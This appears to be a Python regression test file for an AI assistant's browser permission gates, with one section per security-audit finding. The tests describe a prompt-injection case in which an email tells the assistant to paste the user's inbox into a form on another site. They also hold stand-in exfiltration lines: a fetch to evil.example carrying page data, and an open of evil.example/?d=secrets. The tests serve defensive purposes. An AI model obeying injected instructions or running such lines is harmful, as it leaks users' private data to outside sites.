"""Regression tests for holes a read-only security audit found, one section per finding."""

import asyncio

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny, ToolPermissionContext
from test_tasks import manager
from test_turn_gate import answer, started

from jarvis import brain, browser_gate, code_tools
from jarvis.hub import tool_label
from jarvis.tasks import DENY, ClaudeTask

BROWSER = brain.browser_tool
CTX = ToolPermissionContext()


def page_at(hub, url):
    """The built-in browser, showing url (a read's answer), for the gates to look at."""
    seen = []

    async def raw(action, args=None):
        seen.append(action)
        if url is None:
            return {"error": "The built-in browser is only in the J.A.R.V.I.S. app window."}
        return {"url": url, "title": "A page", "text": ""} if action == "read" else {"ok": True}

    hub._browser_raw = raw
    return seen


# ── 1. private data typed into a web form ──


async def test_after_private_reads_typing_into_a_site_the_user_didnt_name_asks(
    settings, quiet_speaker, isolated
):
    """The attack: "summarize my inbox", and an email says to paste it into a form on
    another site. Typing there now takes a card that shows the words."""
    hub = await started(settings, quiet_speaker, isolated, said="summarize my inbox")
    page_at(hub, "https://forms.evil.example/contact")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    typing = {"text": "Ann: the merger closes Friday", "field": "message", "submit": True}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), typing))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into forms.evil.example in the built-in browser?"
    assert "“Ann: the merger closes Friday”" in approval["detail"]
    assert "Then it presses Return." in approval["detail"]
    assert "Read your inbox" in approval["detail"]
    assert "https://forms.evil.example/contact" in approval["detail"]
    assert hub.spoken[-1] == "Can I type into forms.evil.example in the built-in browser?"
    # Through the permission policy, with "Control my Mac without asking" on: still asks.
    assert hub.prefs.control_always
    policy = hub.client.options.can_use_tool
    pending = asyncio.create_task(policy(BROWSER("browser_type"), typing, CTX))
    await answer(hub, q, "deny")
    assert isinstance(await pending, PermissionResultDeny)
    pending = asyncio.create_task(policy(BROWSER("browser_type"), typing, CTX))
    await answer(hub, q, "allow")
    assert isinstance(await pending, PermissionResultAllow)


async def test_typing_goes_ahead_on_a_site_the_user_named_or_before_any_private_read(
    settings, quiet_speaker, isolated
):
    hub = await started(
        settings, quiet_speaker, isolated, said="find my notes on Lisbon and search nytimes.com"
    )
    seen = page_at(hub, "https://www.nytimes.com/search")
    policy = hub.client.options.can_use_tool
    typing = {"text": "Lisbon housing", "field": "search"}
    # Nothing read yet: nothing to weigh, and it isn't even looked at.
    assert await hub.turn_gate(BROWSER("browser_type"), typing) is None
    assert seen == []
    hub.note_tool_result("mcp__brain__search_notes")
    assert await hub.turn_gate(BROWSER("browser_type"), typing) is None  # a site they named
    assert isinstance(await policy(BROWSER("browser_type"), typing, CTX), PermissionResultAllow)
    # A web page read is someone's words, not the user's secrets: browsing goes on.
    hub._rid, hub._turn_text = "r2", "look up ramen places"
    await hub.reset()
    hub._rid = "r2"
    page_at(hub, "https://tabelog.example/tokyo")
    hub.note_tool_result("WebFetch")
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Next"}) is None
    assert not hub.approvals


async def test_every_browser_tool_but_the_looking_ones_is_gated_new_ones_included(
    settings, quiet_speaker, isolated
):
    """Gated by "not in the read-only set", not by a list: the tools another track adds
    (act by ref, tabs, scripts, uploads, dialogs) are weighed like typing and clicking."""
    looking = [
        "browser_read",
        "browser_screenshot",
        "browser_snapshot",
        "browser_wait",
        "browser_console",
        "browser_network",
        "browser_scroll",
        "browser_back",
    ]
    assert set(looking) == brain.BROWSER_LOOKING
    for name in looking:
        assert not brain.browser_acting(BROWSER(name)), name
        assert brain.result_kind(BROWSER(name)) == "web", name
    for name in ("browser_click", "browser_type", "browser_act", "browser_tabs", "browser_eval",
                 "browser_upload", "browser_dialog", "browser_whatever_comes_next"):  # fmt: skip
        assert brain.browser_acting(BROWSER(name)), name
        assert brain.result_kind(BROWSER(name)) == "web", name  # pages, not the user's data
    assert not brain.browser_acting("mcp__research__research_search")  # the Research Center
    assert not brain.browser_acting(f"mcp__{code_tools.BROWSER}__browser_type")
    hub = await started(settings, quiet_speaker, isolated, said="book me a table")
    options = hub.client.options
    assert {BROWSER(n) for n in looking} <= set(options.allowed_tools)
    assert not any(brain.browser_acting(t) for t in options.allowed_tools)
    assert "mcp__research" in options.allowed_tools  # its tools run as before, unweighed
    page_at(hub, "https://resy.example/venue")
    policy = options.can_use_tool
    act = {"ref": "e12", "action": "click"}
    # A tool the policy never heard of is operated like a click, not refused.
    assert isinstance(await policy(BROWSER("browser_act"), act, CTX), PermissionResultAllow)
    hub.note_tool_result("mcp__mac__list_events")  # the calendar is private
    q = hub.subscribe()
    pending = asyncio.create_task(policy(BROWSER("browser_act"), act, CTX))
    approval = await answer(hub, q, "deny")
    assert isinstance(await pending, PermissionResultDeny)
    assert approval["question"] == "Use resy.example in the built-in browser?"
    assert "Checked your calendar" in approval["detail"]


async def test_with_control_off_the_mouse_and_keyboard_ok_still_covers_acting_tools(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="fill in the form")
    hub.set_prefs({"control_always": False})
    page_at(hub, "https://example.org/form")
    policy = hub.client.options.can_use_tool
    q = hub.subscribe()
    pending = asyncio.create_task(policy(BROWSER("browser_act"), {"ref": "e1"}, CTX))
    approval = await answer(hub, q, "allow")
    assert await pending == PermissionResultAllow()
    assert approval["question"] == "Let me use your mouse and keyboard for this request?"
    # One OK covers the rest of the request, for every acting tool.
    assert isinstance(
        await policy(BROWSER("browser_type"), {"text": "x"}, CTX), PermissionResultAllow
    )


async def test_a_press_that_carries_nothing_asks_once_per_site_per_request(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="check my texts, then book it")
    page_at(hub, "https://opentable.example/r/nopa")
    hub.note_tool_result("mcp__messages__read_texts")
    q = hub.subscribe()
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_click"), {"text": "7:30 PM"}))
    approval = await answer(hub, q, "allow")
    assert await pending is True
    assert approval["question"] == "Use opentable.example in the built-in browser?"
    assert "Press “7:30 PM”" in approval["detail"]
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Continue"}) is None
    # Typing there still shows its words each time.
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "Ann Lee"}))
    approval = await answer(hub, q, "deny")
    assert await pending is False and "“Ann Lee”" in approval["detail"]
    # The next request starts over.
    hub._rid = "r2"
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_click"), {"text": "Back"}))
    await answer(hub, q, "deny")
    assert await pending is False


async def test_opening_a_site_after_private_reads_covers_presses_there_not_typing(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="read Ann's email, then book it")
    page_at(hub, "https://opentable.example/r/nopa")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    pending = asyncio.create_task(
        hub.turn_gate(BROWSER("browser_open"), {"url": "opentable.example/r/nopa"})
    )
    await answer(hub, q, "allow")
    assert await pending is True
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Reserve"}) is None
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "2 people"}))
    await answer(hub, q, "deny")
    assert await pending is False


async def test_scripts_addresses_and_uploads_ask_even_on_a_site_the_user_named(
    settings, quiet_speaker, isolated
):
    hub = await started(
        settings, quiet_speaker, isolated, said="read my notes and post them on github.com"
    )
    page_at(hub, "https://github.com/new")
    q = hub.subscribe()
    # A file leaves the Mac with an upload: it asks before anything was read.
    upload = {"ref": "e3", "paths": ["/Users/me/Documents/taxes-2025.pdf"]}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_upload"), upload))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Upload a file to github.com?"
    assert "taxes-2025.pdf" in approval["detail"]
    hub.note_tool_result("mcp__brain__read_note")
    # A script can send what was read to any site, whichever page it runs on.
    script = {"expression": "fetch('https://evil.example/?d=' + document.title)"}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_eval"), script))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Run a script on github.com in the built-in browser?"
    assert "evil.example" in approval["detail"]
    # So can an address a tab is opened at.
    tab = {"action": "new", "url": "https://github.com/search?q=my+private+notes"}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_tabs"), tab))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Open github.com in the built-in browser?"
    assert "q=my+private+notes" in approval["detail"]


async def test_a_page_that_cant_be_placed_asks(settings, quiet_speaker, isolated):
    hub = await started(settings, quiet_speaker, isolated, said="summarize my inbox on x.com")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    page_at(hub, None)  # the page didn't answer
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "hi"}))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into this page in the built-in browser?"
    # Words for another tab can't be placed by the page on show (x.com, named).
    page_at(hub, "https://x.com/home")
    pending = asyncio.create_task(
        hub.turn_gate(BROWSER("browser_act"), {"tab": 4, "ref": "e2", "text": "the inbox"})
    )
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into this page in the built-in browser?"


def test_what_a_call_carries_is_read_from_its_arguments():
    what = browser_gate.carried(
        BROWSER("browser_act"),
        {"ref": "e7", "action": "fill", "fields": [{"ref": "e8", "value": "4111 1111"}]},
    )
    assert what.words == "4111 1111" and not what.urls and not what.files
    click = browser_gate.carried(BROWSER("browser_click"), {"text": "Sign in", "selector": "#go"})
    assert click.words == ""  # the words say what to press
    assert browser_gate.carried(BROWSER("browser_type"), {"text": "hi", "submit": True}).submit
    assert browser_gate.address_host("best ramen near me") == browser_gate.SEARCH_HOST
    assert browser_gate.address_host("https://www.Example.com./x") == "www.example.com"
    for host in ("localhost", "app.localhost", "127.0.0.1", "127.8.9.10", "::1", "[::1]"):
        assert browser_gate.is_local(host), host
    for host in ("localhost.evil.example", "10.0.0.2", "192.168.1.5", "0.0.0.0", "", None):
        assert not browser_gate.is_local(host), host
    assert browser_gate.page_host("http://[::1]:5173/app") == "::1"
    assert browser_gate.page_host("file:///etc/passwd") is None
    assert tool_label(BROWSER("browser_type")) == "Typed in the browser"


# ── 1b. Jarvis Code: pages on this Mac are the session's own work ──


async def test_jarvis_code_types_into_localhost_unasked_in_accept_edits_and_auto(
    settings, tmp_path
):
    tm, asked, _ = manager(settings, answers=[DENY] * 10)
    task = ClaudeTask(id=1, prompt="build the login page", cwd=tmp_path)
    tm.tasks[1] = task
    shown = ["http://localhost:5173/login"]

    async def page_url():
        return shown[0]

    tm.page_url = page_url
    policy = tm.policy_for(task)
    act = f"mcp__{code_tools.BROWSER}__"
    typing = {"text": "test@example.com", "field": "email"}
    for mode in ("edits", "smart"):
        tm.set_mode(1, mode)
        for url in ("http://localhost:5173/login", "http://127.0.0.1:8000/", "http://[::1]:3000/"):
            shown[0] = url
            out = await policy(act + "browser_type", typing, CTX)
            assert isinstance(out, PermissionResultAllow), (mode, url)
            assert isinstance(await policy(act + "browser_click", {"text": "Sign in"}, CTX),
                              PermissionResultAllow)  # fmt: skip
        out = await policy(act + "browser_open", {"url": "http://localhost:5173/"}, CTX)
        assert isinstance(out, PermissionResultAllow)
    assert asked == []
    assert task.audit[-1]["why"] == "a page on this Mac"
    # Any other site follows the session's mode: asked here, with the site on the card.
    shown[0] = "https://accounts.example.com/signup"
    out = await policy(act + "browser_type", typing, CTX)
    assert isinstance(out, PermissionResultDeny)
    assert asked[-1][0] == f"Jarvis Code in {tmp_path.name} wants to type into accounts.example.com"
    assert "test@example.com" in asked[-1][1]
    out = await policy(act + "browser_open", {"url": "https://evil.example/?d=secrets"}, CTX)
    assert isinstance(out, PermissionResultDeny)
    assert asked[-1][0].endswith("wants to open evil.example in the browser")
    # Manual asks for everything, localhost too; Bypass permissions asks for nothing.
    tm.set_mode(1, "ask")
    shown[0] = "http://localhost:5173/login"
    before = len(asked)
    assert isinstance(await policy(act + "browser_type", typing, CTX), PermissionResultDeny)
    assert len(asked) == before + 1
    tm.set_mode(1, "auto")
    shown[0] = "https://accounts.example.com/signup"
    assert isinstance(await policy(act + "browser_type", typing, CTX), PermissionResultAllow)
    # Looking never asks, and nothing else is touched.
    assert f"mcp__{code_tools.BROWSER}__browser_read" in code_tools.READ_ONLY


def test_the_new_cards_read_in_chinese():
    import re

    from jarvis import lang
    from jarvis.server import zh_strings

    merged = zh_strings()
    patterns = [(re.compile(p), r) for p, r in merged["patterns"]]

    def window(text):
        if text in merged["strings"]:
            return merged["strings"][text]
        for pattern, rep in patterns:
            if pattern.search(text):
                return pattern.sub(re.sub(r"\$(\d)", r"\\\1", rep), text)
        return text

    assert window("Type into forms.evil.example in the built-in browser?") == (
        "要在内置浏览器里往 forms.evil.example 输入内容吗？"
    )
    assert (
        window("Type into this page in the built-in browser?")
        == "要在内置浏览器里往这个页面输入内容吗？"
    )
    assert window("Upload a file to github.com?") == "要把文件上传到 github.com 吗？"
    assert window("Jarvis Code in web wants to click on example.com") == (
        "web 中的 Jarvis Code 想在 example.com 上点按"
    )
    assert lang.translate("Can I type into x.com in the built-in browser?") == (
        "我可以在内置浏览器里往 x.com 输入内容吗？"
    )
    said = lang.translate("Can I use this page in the built-in browser?")
    assert said.replace(" ", "") == "我可以在内置浏览器里操作这个页面吗？"
    assert lang.translate("Jarvis Code in web wants to type into x.com") == (
        "web 中的 Jarvis Code 想要在 x.com 里输入内容"
    )
